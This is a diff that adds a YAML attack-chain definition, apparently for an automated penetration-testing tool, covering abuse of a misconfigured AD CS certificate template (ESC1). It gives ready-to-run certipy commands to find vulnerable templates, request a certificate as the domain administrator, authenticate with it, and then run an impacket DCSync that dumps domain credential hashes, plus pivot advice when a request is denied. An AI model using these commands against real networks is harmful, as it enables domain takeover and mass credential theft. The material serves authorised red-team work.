@@ -1,0 +1,51 @@
+chain_id: adcs_esc1_template_abuse
+title: "AD CS — ESC1 enrollee-supplied SAN to domain admin certificate"
+severity: CRITICAL
+tags: [ad, adcs, esc1, certify, certipy, certificates]
+
+trigger:
+  any_of:
+    - { kind: "ad-user" }
+    - { kind: "valid-cred" }
+    - { service_pattern: "(?i)mscs|certsrv" }
+
+description: |
+  ESC1: an AD CS template that allows enrollee-supplied SAN with low-priv
+  enrollment rights. Any valid domain user can request a certificate as
+  Domain Administrator and authenticate with it. End-to-end is one
+  certipy command for enumeration + one for exploitation.
+
+steps:
+  - id: 1
+    title: "Enumerate templates with certipy"
+    command: |
+      certipy find -u USUARIO@$DOMAIN -p 'PASSWORD' -dc-ip $DC -vulnerable -stdout
+
+  - id: 2
+    title: "If a template is reported [ESC1] vulnerable, request a cert as DA"
+    command: |
+      certipy req -u USUARIO@$DOMAIN -p 'PASSWORD' -dc-ip $DC \
+        -ca CA-NAME -template TEMPLATE -upn 'administrator@DOMAIN.LOCAL' \
+        -out admin
+
+  - id: 3
+    title: "Authenticate with the issued cert (PKINIT) → TGT"
+    command: |
+      certipy auth -pfx admin.pfx -dc-ip $DC
+
+  - id: 4
+    title: "Use the TGT for DCSync"
+    command: |
+      export KRB5CCNAME=administrator.ccache
+      impacket-secretsdump -k -no-pass -just-dc 'DOMAIN/Administrator@DC.DOMAIN.LOCAL'
+
+common_errors:
+  - error: "certipy req fails with 'Certificate request denied'"
+    solution: |
+      The template might require manager approval (`requires-manager-approval`).
+      Look for ESC2/ESC3/ESC8 instead, or pivot to the Web Enrollment endpoint
+      (chain adcs_esc8_relay).
+
+references:
+  - https://github.com/ly4k/Certipy
+  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
